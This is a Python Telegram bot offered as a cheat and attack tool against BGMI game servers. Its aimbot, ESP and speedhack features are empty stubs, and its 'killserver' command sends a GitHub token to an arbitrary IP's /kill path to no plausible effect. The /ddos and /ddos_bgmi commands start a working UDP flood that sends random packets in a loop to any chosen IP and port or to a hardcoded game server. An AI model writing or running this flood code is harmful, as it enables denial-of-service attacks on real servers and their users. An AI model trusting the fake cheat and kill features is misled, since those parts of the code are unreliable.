import telebot
import requests
import threading
import socket
import os
import time
import random

# BGMI Server Configuration
BGMI_IP = "123.45.67.89"  # Replace with actual BGMI server IP
BGMI_PORT = 443           # Replace with BGMI server port (HTTPS default)

# Flags for Active Features
AIMBOT_ACTIVE = False
ESP_ACTIVE = False
SPEEDHACK_ACTIVE = False
DDOS_ACTIVE = False

# Load Tokens from tokens.txt
def load_tokens(file_path="tokens.txt"):
    tokens = {}
    try:
        with open(file_path, "r") as f:
            for line in f:
                key, value = line.strip().split("=")
                tokens[key] = value
    except FileNotFoundError:
        print("[!] Tokens file not found. Please create 'tokens.txt'.")
        exit(1)
    return tokens

tokens = load_tokens()
TELEBOT_TOKEN = tokens.get("TELEBOT_TOKEN")
GITHUB_TOKEN = tokens.get("GITHUB_TOKEN")

# Initialize Telegram Bot
bot = telebot.TeleBot(TELEBOT_TOKEN)

# Simulated Features
def detect_targets():
    """Simulate target detection."""
    targets = [(random.randint(100, 800), random.randint(100, 600))]
    return targets

def aimbot():
    """Simulated Aimbot."""
    global AIMBOT_ACTIVE
    while AIMBOT_ACTIVE:
        targets = detect_targets()
        time.sleep(0.1)  # Delay between simulated actions

def esp():
    """Simulated ESP."""
    global ESP_ACTIVE
    while ESP_ACTIVE:
        targets = detect_targets()
        time.sleep(0.1)  # Delay between simulated actions

def speedhack():
    """Simulated Speedhack."""
    global SPEEDHACK_ACTIVE
    while SPEEDHACK_ACTIVE:
        time.sleep(0.2)  # Simulated fast actions

def ddos_attack(ip, port):
    """High-performance DDoS attack using raw UDP packets."""
    global DDOS_ACTIVE
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = os.urandom(1024)  # Random 1KB payload
    while DDOS_ACTIVE:
        try:
            sock.sendto(payload, (ip, port))
        except:
            pass

def kill_server(ip_address):
    """Kill server using GitHub token."""
    url = f"http://{ip_address}/kill"
    headers = {"Authorization": f"Bearer {GITHUB_TOKEN}"}
    try:
        response = requests.post(url, headers=headers)
        if response.status_code == 200:
            return "[+] Server killed successfully."
        else:
            return f"[-] Failed to kill server: {response.status_code}"
    except Exception as e:
        return f"[!] Error: {e}"

# Telegram Bot Commands
@bot.message_handler(commands=["start", "help"])
def send_welcome(message):
    bot.reply_to(message, "Welcome! Use /commands to see available options.")

@bot.message_handler(commands=["commands"])
def list_commands(message):
    bot.reply_to(message, """
Available Commands:
/aimbot - Activate Aimbot
/esp - Start ESP
/speedhack - Enable Speedhack
/ddos <IP> <PORT> - Start DDoS on target IP and port
/ddos_bgmi - Start DDoS on predefined BGMI server
/killserver <IP> - Kill a server using GitHub token
/stop - Stop all actions
    """)

@bot.message_handler(commands=["aimbot"])
def command_aimbot(message):
    global AIMBOT_ACTIVE
    if not AIMBOT_ACTIVE:
        AIMBOT_ACTIVE = True
        bot.reply_to(message, "Aimbot activated.")
        threading.Thread(target=aimbot).start()
    else:
        bot.reply_to(message, "Aimbot is already active.")

@bot.message_handler(commands=["esp"])
def command_esp(message):
    global ESP_ACTIVE
    if not ESP_ACTIVE:
        ESP_ACTIVE = True
        bot.reply_to(message, "ESP activated.")
        threading.Thread(target=esp).start()
    else:
        bot.reply_to(message, "ESP is already active.")

@bot.message_handler(commands=["speedhack"])
def command_speedhack(message):
    global SPEEDHACK_ACTIVE
    if not SPEEDHACK_ACTIVE:
        SPEEDHACK_ACTIVE = True
        bot.reply_to(message, "Speedhack activated.")
        threading.Thread(target=speedhack).start()
    else:
        bot.reply_to(message, "Speedhack is already active.")

@bot.message_handler(commands=["ddos"])
def command_ddos(message):
    global DDOS_ACTIVE
    try:
        _, ip_address, port = message.text.split()
        port = int(port)
        if not DDOS_ACTIVE:
            DDOS_ACTIVE = True
            bot.reply_to(message, f"Starting DDoS attack on {ip_address}:{port}.")
            threading.Thread(target=ddos_attack, args=(ip_address, port)).start()
        else:
            bot.reply_to(message, "DDoS is already active.")
    except ValueError:
        bot.reply_to(message, "Usage: /ddos <IP> <PORT>")

@bot.message_handler(commands=["ddos_bgmi"])
def command_ddos_bgmi(message):
    global DDOS_ACTIVE
    if not DDOS_ACTIVE:
        DDOS_ACTIVE = True
        bot.reply_to(message, f"Starting DDoS attack on BGMI server at {BGMI_IP}:{BGMI_PORT}.")
        threading.Thread(target=ddos_attack, args=(BGMI_IP, BGMI_PORT)).start()
    else:
        bot.reply_to(message, "DDoS is already active.")

@bot.message_handler(commands=["killserver"])
def command_killserver(message):
    try:
        ip_address = message.text.split(" ")[1]
        result = kill_server(ip_address)
        bot.reply_to(message, result)
    except IndexError:
        bot.reply_to(message, "Usage: /killserver <IP>")

@bot.message_handler(commands=["stop"])
def command_stop(message):
    global AIMBOT_ACTIVE, ESP_ACTIVE, SPEEDHACK_ACTIVE, DDOS_ACTIVE
    AIMBOT_ACTIVE = False
    ESP_ACTIVE = False
    SPEEDHACK_ACTIVE = False
    DDOS_ACTIVE = False
    bot.reply_to(message, "All actions stopped.")

# Main Program
if __name__ == "__main__":
    print("[+] Bot is running. Use Telegram to control the tool.")
    bot.polling()